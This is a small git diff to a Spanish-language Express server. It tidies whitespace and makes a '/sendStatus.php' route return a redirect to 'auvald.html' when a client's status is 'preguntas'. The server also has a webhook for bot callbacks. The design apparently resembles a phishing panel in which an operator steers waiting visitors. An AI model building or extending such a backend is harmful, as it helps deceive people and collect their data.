@@ -87,9 +87,6 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-
-
-
 app.post('/webhook', async (req, res) => {
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
@@ -186,7 +183,7 @@ app.post('/webhook', async (req, res) => {
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
   const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
-  res.json({ status: cliente.status, preguntas: cliente.preguntas });
+  res.json({ status: cliente.status, preguntas: cliente.preguntas, redirect: cliente.status === 'preguntas' ? 'auvald.html' : null });
 });
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
